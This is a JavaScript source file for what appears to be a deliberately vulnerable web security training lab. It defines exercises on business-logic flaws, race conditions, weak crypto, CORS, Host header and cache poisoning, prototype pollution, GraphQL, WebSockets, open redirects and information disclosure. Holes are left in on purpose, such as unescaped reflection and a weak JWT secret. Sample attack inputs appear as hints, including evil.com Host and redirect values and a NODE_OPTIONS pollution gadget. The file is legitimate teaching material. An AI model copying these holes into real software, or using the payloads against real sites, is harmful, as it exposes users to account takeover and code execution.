// ============================================================
const bl = {
  // price tampering
  async price(req, url, ctx) {
    const card = `<div class="card"><h3>Checkout</h3>
      <p class="muted">Add a jacket to your cart and tamper with the price the client submits.</p>
      <form method="post"><input type="hidden" name="productId" value="1"><input type="text" name="price" value="1337"><button>Add to cart</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const f = await form(req);
    const price = parseFloat(f.price);
    const solved = !isNaN(price) && price < 0;
    return {
      body: page(card + (solved ? ok('Cart updated: jacket added at $' + h(f.price) + ' (negative price = store owes you money).') : ok('Cart updated: $' + h(f.price) + '.') + ' <a class="link" href="/lab/bl-1">back</a>')),
      solved
    };
  },

  // negative quantity
  async quantity(req, url, ctx) {
    const card = `<div class="card"><h3>Buy a jacket</h3>
      <p class="muted">The quantity is only validated client-side. Try a negative quantity.</p>
      <form method="post"><input type="text" name="quantity" value="1"><button>Add to cart</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const f = await form(req);
    const qty = parseInt(f.quantity);
    const solved = !isNaN(qty) && qty < 0;
    return {
      body: page(card + (solved ? ok('Added -' + h(f.quantity) + ' jackets — your balance increased.') : ok('Added ' + h(f.quantity) + ' jacket(s).') + ' <a class="link" href="/lab/bl-2">back</a>')),
      solved
    };
  },

  // coupon reuse
  async coupon(req, url, ctx) {
    const card = `<div class="card"><h3>Apply discount code</h3>
      <p class="muted">One-time coupon: <span class="mono">NEWCUST15</span>. The server may not track redemption properly.</p>
      <form method="post"><input type="text" name="coupon" value="NEWCUST15"><button>Apply</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const f = await form(req);
    const coupon = f.coupon || '';
    if (coupon !== 'NEWCUST15') return { body: page(card + err('Unknown coupon.')) };
    const count = (couponUse.get(coupon) || 0);
    couponUse.set(coupon, count + 1);
    const solved = count >= 1; // already used once -> reuse discovered
    return {
      body: page(card + (solved ? ok('Coupon applied again — the redemption counter was not persisted.') : ok('Coupon applied: -15%.') + ' <a class="link" href="/lab/bl-3">apply again</a>')),
      solved
    };
  }
};

// ============================================================
//  Race conditions (emulated with a check-then-act window)
// ============================================================
const race = {
  // single-endpoint limit overrun: redeem coupon twice in parallel
  async redeem(req, url, ctx) {
    const card = `<div class="card"><h3>Redeem coupon</h3>
      <p class="muted">One-time coupon <span class="mono">RACE50</span>. The server checks "used?" then marks it used — race two requests.</p>
      <form method="post"><input type="text" name="coupon" value="RACE50"><button>Redeem</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const f = await form(req);
    const coupon = f.coupon || '';
    // check-then-act with a simulated delay window
    const prev = redeemed.get(coupon) || null;
    if (prev) return { body: page(card + err('Coupon already redeemed.')) };
    await new Promise(r => setTimeout(r, 80)); // race window
    redeemed.set(coupon, { ts: Date.now(), count: 1 });
    const count = (raceEmailTs.get(coupon) || 0) + 1;
    raceEmailTs.set(coupon, count);
    const solved = count >= 2;
    return {
      body: page(card + (solved ? ok('Coupon redeemed multiple times via parallel requests — limit overrun!') : ok('Coupon redeemed: -50%.'))),
      solved
    };
  },

  // multi-endpoint: change email + reset password simultaneously
  async multi(req, url, ctx) {
    if (ctx === '/email') {
      raceEmailTs.set('multi', Date.now());
      const other = raceResetTs.get('multi') || 0;
      const solved = Date.now() - other < 600 && other > 0;
      return { body: page(ok(solved ? 'Email changed (and password reset in the same tick!)' : 'Email changed.')), solved };
    }
    if (ctx === '/reset') {
      raceResetTs.set('multi', Date.now());
      const other = raceEmailTs.get('multi') || 0;
      const solved = Date.now() - other < 600 && other > 0;
      return { body: page(ok(solved ? 'Password reset (and email changed in the same tick!)' : 'Password reset email sent.')), solved };
    }
    return {
      body: page(`<div class="card"><h3>Account actions (race)</h3>
        <p class="muted">Fire <span class="mono">POST /lab/race-2/email</span> and <span class="mono">POST /lab/race-2/reset</span> simultaneously. Each is individually validated, but together they bypass the flow.</p></div>`)
    };
  }
};

// ============================================================
//  Weak crypto
// ============================================================
const crypto = {
  // predictable password reset token: token = md5(username)
  async token(req, url, ctx) {
    const card = `<div class="card"><h3>Forgot password</h3>
      <p class="muted">Reset tokens are generated as <span class="mono">md5(username)</span> — fully predictable.</p>
      <form method="get"><input type="text" name="username" placeholder="carlos"><button>Get token</button></form></div>`;
    const username = url.searchParams.get('username') || '';
    const token = username ? md5Hex(username) : '';
    const submitted = url.searchParams.get('token') || '';
    const solved = username && submitted && submitted === token;
    const card2 = card + (token ? `<div class="card">Token for <b>${h(username)}</b>: <span class="mono">${h(token)}</span>
      <p class="muted">Reset: <a class="link" href="/lab/crypto-1/reset?token=${token}&username=${h(username)}">/lab/crypto-1/reset?token=${token}&amp;username=${h(username)}</a></p></div>` : '');
    if (ctx === '/reset') {
      const u = url.searchParams.get('username') || '';
      const t = url.searchParams.get('token') || '';
      const good = t && t === md5Hex(u);
      return {
        body: page(card2 + (good ? ok('Password reset for ' + h(u) + ' — predictable token accepted.') : err('Invalid token.'))),
        solved: good
      };
    }
    return { body: page(card2) };
  },

  // weak signature: token = header.payload + md5(secret+payload) where secret is guessable
  async jwt(req, url, ctx) {
    const raw = (req.headers.get('authorization') || '').replace(/^Bearer\s+/i, '') || (req.headers.get('cookie') || '').match(/jwt=([^;]+)/)?.[1] || '';
    const parts = raw.split('.');
    let role = '';
    let sigOk = false;
    if (parts.length === 3) {
      try {
        const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
        role = payload.role || '';
        const secret = 'supersecret';
        sigOk = md5Hex(secret + parts[1]) === parts[2];
      } catch (e) {}
    }
    const solved = role === 'admin' && sigOk;
    const card = `<div class="card"><h3>Admin API</h3>
      <p class="muted">Tokens are signed with a weak secret using <span class="mono">md5(secret + payload)</span>. Guess the secret and forge an admin token.</p>
      <p class="warn">(Secret hint: it appears in the page source as a default — try <span class="mono">supersecret</span>.)</p></div>`;
    return {
      body: page(card + (solved ? ok('Welcome, admin. JWT forged with a guessable secret.') : ok('Access denied.') + ' <span class="muted">role=' + h(role) + ' sig=' + (sigOk ? 'ok' : 'bad') + '</span>')),
      solved
    };
  }
};

// ============================================================
//  CORS (misconfigured cross-origin resource sharing)
// ============================================================
const corsLabs = {
  // reflects ANY foreign Origin with credentials=true
  async any(req, url, ctx) {
    const origin = req.headers.get('Origin') || '';
    const foreign = origin && origin !== url.origin;
    const solved = foreign;
    return { body: page(`<div class="card"><h3>My Account API</h3>
      <p class="muted">Endpoint <span class="mono">GET /lab/cors-1</span> reflects any Origin and allows credentials — an attacker page can read the response.</p>
      <p>Origin on request: <b>${h(origin || '(none)')}</b> — ${solved ? ok('reflected + credentials allowed (vulnerable)') : err('nothing foreign reflected')}</p></div>`), solved };
  },
  // trusts the literal "null" origin
  async nullOrigin(req, url, ctx) {
    const origin = req.headers.get('Origin') || '';
    const solved = origin === 'null';
    return { body: page(`<div class="card"><h3>Trusted partners API</h3>
      <p class="muted">Only sandboxed (file://, iframe <span class="mono">sandbox</span>) requests send <span class="mono">Origin: null</span>. The server blindly trusts it.</p>
      <p>Origin on request: <b>${h(origin || '(none)')}</b> — ${solved ? ok('Origin: null treated as trusted (vulnerable)') : err('not trusted')}</p></div>`), solved };
  },
  // allowlist bug: origin.endsWith('trusted.com') without leading dot
  async suffix(req, url, ctx) {
    const origin = req.headers.get('Origin') || '';
    const foreign = origin && origin !== url.origin;
    const solved = foreign && origin.endsWith('trusted.com');
    return { body: page(`<div class="card"><h3>Trusted partners API</h3>
      <p class="muted">Intended allowlist: <span class="mono">https://trusted.com</span>. The check is <span class="mono">origin.endsWith('trusted.com')</span> — missing the leading dot, so <span class="mono">https://eviltrusted.com</span> passes.</p>
      <p>Origin on request: <b>${h(origin || '(none)')}</b> — ${solved ? ok('endsWith allowlist bypassed (vulnerable)') : err('not approved')}</p></div>`), solved };
  },
  // allowlist bug: origin.includes('partner.com') substring match
  async substring(req, url, ctx) {
    const origin = req.headers.get('Origin') || '';
    const foreign = origin && origin !== url.origin;
    const solved = foreign && origin.includes('partner.com');
    return { body: page(`<div class="card"><h3>Partner API</h3>
      <p class="muted">Allowlist uses <span class="mono">origin.includes('partner.com')</span> — a substring match, so <span class="mono">https://evilpartner.com</span> passes.</p>
      <p>Origin on request: <b>${h(origin || '(none)')}</b> — ${solved ? ok('substring allowlist bypassed (vulnerable)') : err('not approved')}</p></div>`), solved };
  }
};

// ============================================================
//  Host header attacks
// ============================================================
const hostLabs = {
  // password reset poisoning via Host header
  async reset(req, url, ctx) {
    const host = req.headers.get('host') || url.host;
    const xfh = req.headers.get('x-forwarded-host') || '';
    const poisoned = (host && host !== url.host) ? host : (xfh && xfh !== url.host ? xfh : '');
    const card = `<div class="card"><h3>Forgot password</h3>
      <p class="muted">POST <span class="mono">/lab/host-1/reset?username=carlos</span>. The reset link is built from the <b>Host</b> header — poison it (a front-end proxy may forward it as <span class="mono">X-Forwarded-Host</span>) to hijack the reset.</p>
      <form method="post"><input type="text" name="username" value="carlos"><button>Reset password</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const solved = !!poisoned;
    const link = `https://${poisoned || url.host}/reset?token=3a2b1c9d`;
    return { body: page(card + (solved ? ok('Reset link sent to attacker-controlled host: ' + h(link)) : ok('Reset link sent: ' + h(link)))), solved };
  },
  // password reset poisoning via X-Forwarded-Host (host header trusted by proxy)
  async xfh(req, url, ctx) {
    const xfh = req.headers.get('x-forwarded-host') || '';
    const card = `<div class="card"><h3>Forgot password</h3>
      <p class="muted">A reverse proxy forwards <span class="mono">X-Forwarded-Host</span> unvalidated. POST <span class="mono">/lab/host-2/reset?username=carlos</span> with a poisoned value.</p>
      <form method="post"><input type="text" name="username" value="carlos"><button>Reset password</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const solved = xfh && xfh !== url.host;
    const link = `https://${xfh || url.host}/reset?token=4f8e2a11`;
    return { body: page(card + (solved ? ok('Reset link uses attacker-controlled X-Forwarded-Host: ' + h(link)) : ok('Reset link sent: ' + h(link)))), solved };
  },
  // Host validation bypass via userinfo (@) injection
  async bypass(req, url, ctx) {
    const host = req.headers.get('host') || url.host;
    const xfh = req.headers.get('x-forwarded-host') || '';
    const poisoned = (host && host !== url.host && host.endsWith(url.host)) ? host
      : (xfh && xfh !== url.host && xfh.endsWith(url.host) ? xfh : '');
    const card = `<div class="card"><h3>Forgot password</h3>
      <p class="muted">The server validates the Host ends with the site hostname, but accepts an attacker prefix separated by <span class="mono">@</span>: <span class="mono">Host: evil.com@${h(url.host)}</span></p>
      <form method="post"><input type="text" name="username" value="carlos"><button>Reset password</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const solved = !!poisoned && /[@/\\]/.test(poisoned);
    const link = `https://${poisoned || url.host}/reset?token=9d1c5f2a`;
    return { body: page(card + (solved ? ok('Validation bypassed — reset link: ' + h(link)) : ok('Reset link sent: ' + h(link)))), solved };
  }
};

// ============================================================
//  Web cache poisoning (emulated: unkeyed inputs reflected)
// ============================================================
const cacheLabs = {
  // unkeyed X-Forwarded-Host reflected into a script src
  async xfhost(req, url, ctx) {
    const xfh = req.headers.get('x-forwarded-host') || '';
    const track = xfh ? `https://${xfh}/track.js` : '/track.js';
    const solved = xfh && xfh !== url.host;
    return { body: page(`<div class="card"><h3>Home</h3>
      <p class="muted">The page embeds a tracker built from the (unkeyed) <span class="mono">X-Forwarded-Host</span> header — send a malicious host and the cached copy serves <span class="mono">evil.com/track.js</span> to everyone.</p>
      <p>Tracker URL: <span class="mono">${h(track)}</span></p>
      <script src="${track}"></script></div>`), solved };
  },
  // unkeyed X-Forwarded-Scheme downgrades the protocol
  async scheme(req, url, ctx) {
    const xfs = req.headers.get('x-forwarded-scheme') || '';
    const scheme = xfs || url.protocol.replace(':', '');
    const solved = xfs === 'http';
    return { body: page(`<div class="card"><h3>Secure page</h3>
      <p class="muted">The page is served over ${h(scheme)}. Sending <span class="mono">X-Forwarded-Scheme: http</span> (unkeyed) forces a cache that serves this page over HTTP to everyone.</p>
      <p>Scheme: <b>${h(scheme)}</b> — ${solved ? ok('downgraded (vulnerable)') : 'normal'}</p></div>`), solved };
  },
  // unkeyed utm_source query param reflected unescaped (stored into cache)
  async utm(req, url, ctx) {
    const utm = url.searchParams.get('utm_source') || '';
    const solved = utm !== '';
    return { body: page(`<div class="card"><h3>Marketing page</h3>
      <p class="muted">Tracking param <span class="mono">utm_source</span> is unkeyed by the cache and reflected unescaped — a poisoned cached copy carries your payload to every visitor.</p>
      <p>utm_source reflected: <b>${utm}</b></p></div>`), solved };
  }
};

// ============================================================
//  Server-side prototype pollution (emulated — no global mutation)
// ============================================================
const protoLabs = {
  // top-level __proto__ in JSON merge
  async proto(req, url, ctx) {
    const card = `<div class="card"><h3>Merge user settings</h3>
      <p class="muted">POST <span class="mono">/lab/proto-1</span> with JSON that is merged into a server-side object via an unsafe merge: <span class="mono">{"__proto__":{"isAdmin":true}}</span></p>
      <pre class="mono">{"isAdmin":false}</pre></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const body = await json(req);
    const polluted = Object.prototype.hasOwnProperty.call(body, '__proto__');
    return { body: page(card + (polluted ? ok('isAdmin=true — top-level __proto__ pollution accepted (emulated, no global state mutated).') : ok('isAdmin=false.'))), solved: polluted };
  },
  // nested via constructor.prototype
  async nested(req, url, ctx) {
    const card = `<div class="card"><h3>Merge user settings (hardened)</h3>
      <p class="muted">Top-level <span class="mono">__proto__</span> is filtered, but a nested path is not: <span class="mono">{"constructor":{"prototype":{"isAdmin":true}}}</span></p>
      <pre class="mono">{"isAdmin":false}</pre></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const body = await json(req);
    const polluted = Object.prototype.hasOwnProperty.call(body, 'constructor')
      && body.constructor
      && Object.prototype.hasOwnProperty.call(body.constructor, 'prototype');
    return { body: page(card + (polluted ? ok('isAdmin=true — nested constructor.prototype pollution accepted.') : ok('isAdmin=false.'))), solved: polluted };
  },
  // pollution gadget: __proto__ with shell/NODE_OPTIONS leads to RCE
  async gadget(req, url, ctx) {
    const card = `<div class="card"><h3>Admin CLI</h3>
      <p class="muted">The server spawns a child process after merging JSON. Polluting <span class="mono">__proto__</span> with gadget keys (<span class="mono">shell</span>, <span class="mono">NODE_OPTIONS</span>) changes how it spawns: <span class="mono">{"__proto__":{"shell":"/proc/self/exe","NODE_OPTIONS":"--require /proc/self/environ"}}</span></p>
      <pre class="mono">{"command":"ls -la"}</pre></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const body = await json(req);
    const ownProto = Object.prototype.hasOwnProperty.call(body, '__proto__');
    const nested = ownProto && body.__proto__ ? body.__proto__ : {};
    const rce = ownProto && (Object.prototype.hasOwnProperty.call(nested, 'shell') || Object.prototype.hasOwnProperty.call(nested, 'NODE_OPTIONS'));
    return { body: page(card + (rce ? ok('child_process spawned via polluted options — arbitrary command execution (emulated).') : ok('command ran with default options.'))), solved: rce };
  }
};

// ============================================================
//  GraphQL API
// ============================================================
const graphql = {
  // introspection enabled leaks the schema
  async intro(req, url, ctx) {
    const card = `<div class="card"><h3>GraphQL API</h3>
      <p class="muted">POST <span class="mono">/lab/graphql-1</span> JSON <span class="mono">{"query":"{ __schema { types { name } } }"}</span></p></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const body = await json(req);
    const q = String(body.query || '');
    const solved = /__schema|__type/.test(q);
    const res = solved
      ? { data: { __schema: { queryType: { name: 'Query' }, types: [ { name: 'Query' }, { name: 'User' }, { name: 'String' }, { name: 'Int' } ] } } }
      : { errors: [{ message: 'Introspection tokens required to view the schema' }] };
    return { body: JSON.stringify(res), solved, contentType: 'application/json' };
  },
  // BOLA: fetch any user object by id without authorization
  async bola(req, url, ctx) {
    const card = `<div class="card"><h3>GraphQL API</h3>
      <p class="muted">The <span class="mono">user(id:)</span> query returns any record — try <span class="mono">{"query":"{ user(id: 2) { username email password } }"}</span></p></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const body = await json(req);
    const q = String(body.query || '');
    const m = q.match(/user\s*\(\s*id\s*:\s*(\d+)\s*\)/);
    const id = m ? +m[1] : null;
    const sensitive = /password|email|secret|ssn/i.test(q);
    const solved = id !== null && id !== 1 && sensitive;
    if (id === null) return { body: JSON.stringify({ errors: [{ message: 'Unknown query' }] }), contentType: 'application/json' };
    const users = {
      1: { username: 'wiener', email: 'wiener@academy.example' },
      2: { username: 'carlos', email: 'carlos@academy.example', password: 'c0rrect-h0rse-b4ttery-st4ple' },
      3: { username: 'montoya', email: 'montoya@academy.example', password: 'p4ssw0rd123' }
    };
    const res = users[id] ? { data: { user: users[id] } } : { data: { user: null } };
    return { body: JSON.stringify(res), solved, contentType: 'application/json' };
  },
  // aliasing / batching: many queries in one array
  async batch(req, url, ctx) {
    const card = `<div class="card"><h3>GraphQL API</h3>
      <p class="muted">Batching is allowed — send a JSON <b>array</b> of queries: <span class="mono">[{"query":"{ping}"},{"query":"{ping}"}]</span></p></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const body = await json(req);
    const isBatch = Array.isArray(body);
    const solved = isBatch && body.length >= 2;
    const res = isBatch
      ? body.map((b, i) => ({ data: { ok: true, index: i, query: (b && b.query) || '' } }))
      : { errors: [{ message: 'Send a JSON array to batch multiple queries' }] };
    return { body: JSON.stringify(res), solved, contentType: 'application/json' };
  }
};

// ============================================================
//  WebSockets (emulated handshake + stored XSS via chat)
// ============================================================
const wsMsgs = [];
const ws = {
  // CSWSH: handshake does not validate Origin, session cookie is reused
  async connect(req, url, ctx) {
    const origin = req.headers.get('Origin') || '';
    const cookie = req.headers.get('cookie') || '';
    const authed = /academy_session=/.test(cookie);
    const crossSite = origin && origin !== url.origin;
    const solved = crossSite && authed;
    return { body: page(`<div class="card"><h3>Live chat (WebSocket)</h3>
      <p class="muted">Connect via <span class="mono">GET /lab/ws-1/connect</span> with an <b>Origin</b> + your session cookie. The handshake never validates Origin → Cross-Site WebSocket Hijacking.</p>
      <p>Origin: <b>${h(origin || '(none)')}</b> · session: ${authed ? ok('present') : err('missing')}</p>
      ${solved ? ok('WebSocket opened from a foreign Origin with your session — attacker can read/send chat as you.') : ''}</div>`), solved };
  },
  // stored XSS: chat messages re-rendered without sanitization
  async send(req, url, ctx) {
    const card = `<div class="card"><h3>Live chat</h3>
      <p class="muted">POST <span class="mono">/lab/ws-2/send</span> JSON <span class="mono">{"message":"hello"}</span>. Messages are re-rendered unescaped on <span class="mono">/lab/ws-2</span> (stored XSS).</p>
      <form method="post"><input type="text" name="message" placeholder="message"><button>Send</button></form></div>`;
    if (req.method === 'POST') {
      const ct = req.headers.get('content-type') || '';
      let text = '';
      if (ct.includes('application/json')) { const b = await json(req); text = b.message || ''; }
      else { const f = await form(req); text = f.message || ''; }
      if (text) wsMsgs.push(text);
      const solved = /<|>|onerror|onload|javascript:/i.test(text);
      return { body: page(card + (solved ? ok('Message delivered — it will render unescaped on <span class="mono">/lab/ws-2</span> (stored XSS).') : ok('Message sent.'))), solved };
    }
    const list = wsMsgs.length ? wsMsgs.map(m => `<div class="card">${m}</div>`).join('') : '<p class="muted">No messages yet.</p>';
    return { body: page(`<div class="card"><h3>Live chat history</h3>${list}</div>`) };
  }
};

// ============================================================
//  Open redirect
// ============================================================
const redirectLabs = {
  // no validation at all
  async open(req, url, ctx) {
    const card = `<div class="card"><h3>Follow link</h3>
      <p class="muted">GET <span class="mono">/lab/redirect-1?url=https://example.com</span> — redirects straight to whatever you supply.</p></div>`;
    const target = url.searchParams.get('url') || '';
    if (!target) return { body: page(card) };
    const solved = !target.startsWith(url.origin) && /^https?:\/\//.test(target);
    return { status: 302, location: target, solved, body: page(card + (solved ? ok('Redirecting off-site to ' + h(target) + ' — open redirect.') : ok('Redirecting.'))) };
  },
  // validation checks "contains academy.example" — bypass with userinfo @
  async bypass(req, url, ctx) {
    const card = `<div class="card"><h3>Login → continue</h3>
      <p class="muted">Validation only checks the target <b>contains</b> <span class="mono">academy.example</span>. Bypass with a userinfo trick: <span class="mono">?url=https://academy.example@evil.com</span></p></div>`;
    const target = url.searchParams.get('url') || '';
    if (!target) return { body: page(card) };
    const validated = target.includes('academy.example');
    if (!validated) return { body: page(card + err('Invalid target: must contain academy.example.')) };
    let host = target;
    const schemeMatch = target.match(/^[a-z][a-z0-9+.-]*:\/\/([^\/?#]+)/i);
    if (schemeMatch) host = schemeMatch[1];
    host = host.split('/')[0];
    if (host.includes('@')) host = host.split('@').pop();
    const offSite = host !== 'academy.example' && host !== 'www.academy.example';
    const solved = offSite;
    return { status: 302, location: target, solved, body: page(card + (solved ? ok('Redirecting off-site to ' + h(host) + ' — validation bypassed.') : ok('Redirecting to ' + h(host) + '.'))) };
  }
};

// ============================================================
//  Information disclosure
// ============================================================
const info = {
  // verbose debug errors leak stack + secrets
  async debug(req, url, ctx) {
    const card = `<div class="card"><h3>Application</h3>
      <p class="muted">A debug route may be enabled: <span class="mono">/lab/info-1/debug</span> (or <span class="mono">?debug=1</span>).</p></div>`;
    const debugPath = ctx === '/debug' || url.searchParams.get('debug') === '1';
    if (!debugPath) return { body: page(card) };
    const leak = `<pre class="mono">GET /api/account
Error: connect ECONNREFUSED 127.0.0.1:5432
  at TCPConnectWrap.afterConnect [as oncomplete] (net.js:1146:16)
  at internal/connect/tcp.js:298:9
DB_PASS=Ac4demy$3cr3t
SESSION_SECRET=7d8f2a1c
Stack: /app/workers/api.js:42:9</pre>`;
    return { body: page(card + ok('Debug mode: verbose errors + secrets exposed.') + leak), solved: true };
  },
  // leftover source map / .git / backup files
  async source(req, url, ctx) {
    const card = `<div class="card"><h3>Static app</h3>
      <p class="muted">Leftover files may be public: <span class="mono">/lab/info-2/app.js.map</span>, <span class="mono">/lab/info-2/.git/config</span>, <span class="mono">/lab/info-2/backup.sql</span>, or <span class="mono">?source=1</span>.</p></div>`;
    const c = (ctx || '').toLowerCase();
    const query = (url.searchParams.get('source') || '').toLowerCase();
    const leaky = c.includes('.map') || c.includes('.git') || c.includes('backup') || query === '1' || query === 'true';
    if (!leaky) return { body: page(card) };
    const src = `<pre class="mono">// app.js (source map backup)
const ADMIN_PW = 'P@ssw0rd_Admin';
function checkLogin(u, p) { return u === 'admin' && p === ADMIN_PW; }
-- backup.sql --
INSERT INTO users (username, password_md5) VALUES ('admin','5f4dcc3b5aa765d61d8327deb882cf99');</pre>`;
    return { body: page(card + ok('Source map / backup exposed — hardcoded secrets.') + src), solved: true };
  }
};

// ============================================================
//  ROUTES
// ============================================================
export const extraRoutes = {
  'ssrf-1': (r, u, c) => ssrf.basic(r, u, c),
  'ssrf-2': (r, u, c) => ssrf.blacklist(r, u, c),
  'ssrf-3': (r, u, c) => ssrf.allowlist(r, u, c),
  'ssrf-4': (r, u, c) => ssrf.blind(r, u, c),
  'xxe-1': (r, u, c) => xxe.basic(r, u, c),
  'xxe-2': (r, u, c) => xxe.svg(r, u, c),
  'xxe-3': (r, u, c) => xxe.blind(r, u, c),
  'xxe-4': (r, u, c) => xxe.ssrf(r, u, c),
  'ssti-1': (r, u, c) => ssti.basic(r, u, c),
  'ssti-2': (r, u, c) => ssti.context(r, u, c),
  'ssti-3': (r, u, c) => ssti.block(r, u, c),
  'ssti-4': (r, u, c) => ssti.noDigits(r, u, c),
  'cmdi-1': (r, u, c) => cmdi.reflected(r, u, c),
  'cmdi-2': (r, u, c) => cmdi.blind(r, u, c),
  'cmdi-3': (r, u, c) => cmdi.newline(r, u, c),
  'nosql-1': (r, u, c) => nosql.login(r, u, c),
  'nosql-2': (r, u, c) => nosql.regex(r, u, c),
  'nosql-3': (r, u, c) => nosql.operator(r, u, c),
  'smug-1': (r, u, c) => smug.clte(r, u, c),
  'smug-2': (r, u, c) => smug.tecl(r, u, c),
  'smug-3': (r, u, c) => smug.tete(r, u, c),
  'deser-1': (r, u, c) => deser.role(r, u, c),
  'deser-2': (r, u, c) => deser.gadget(r, u, c),
  'upload-1': (r, u, c) => upload.none(r, u, c),
  'upload-2': (r, u, c) => upload.contentType(r, u, c),
  'upload-3': (r, u, c) => upload.ext(r, u, c),
  'bl-1': (r, u, c) => bl.price(r, u, c),
  'bl-2': (r, u, c) => bl.quantity(r, u, c),
  'bl-3': (r, u, c) => bl.coupon(r, u, c),
  'race-1': (r, u, c) => race.redeem(r, u, c),
  'race-2': (r, u, c) => race.multi(r, u, c),
  'crypto-1': (r, u, c) => crypto.token(r, u, c),
  'crypto-2': (r, u, c) => crypto.jwt(r, u, c),
  'cors-1': (r, u, c) => corsLabs.any(r, u, c),
  'cors-2': (r, u, c) => corsLabs.nullOrigin(r, u, c),
  'cors-3': (r, u, c) => corsLabs.suffix(r, u, c),
  'cors-4': (r, u, c) => corsLabs.substring(r, u, c),
  'host-1': (r, u, c) => hostLabs.reset(r, u, c),
  'host-2': (r, u, c) => hostLabs.xfh(r, u, c),
  'host-3': (r, u, c) => hostLabs.bypass(r, u, c),
  'cache-1': (r, u, c) => cacheLabs.xfhost(r, u, c),
  'cache-2': (r, u, c) => cacheLabs.scheme(r, u, c),
  'cache-3': (r, u, c) => cacheLabs.utm(r, u, c),
  'proto-1': (r, u, c) => protoLabs.proto(r, u, c),
  'proto-2': (r, u, c) => protoLabs.nested(r, u, c),
  'proto-3': (r, u, c) => protoLabs.gadget(r, u, c),
  'graphql-1': (r, u, c) => graphql.intro(r, u, c),
  'graphql-2': (r, u, c) => graphql.bola(r, u, c),
  'graphql-3': (r, u, c) => graphql.batch(r, u, c),
  'ws-1': (r, u, c) => ws.connect(r, u, c),
  'ws-2': (r, u, c) => ws.send(r, u, c),
  'redirect-1': (r, u, c) => redirectLabs.open(r, u, c),
  'redirect-2': (r, u, c) => redirectLabs.bypass(r, u, c),
  'info-1': (r, u, c) => info.debug(r, u, c),
  'info-2': (r, u, c) => info.source(r, u, c)
};
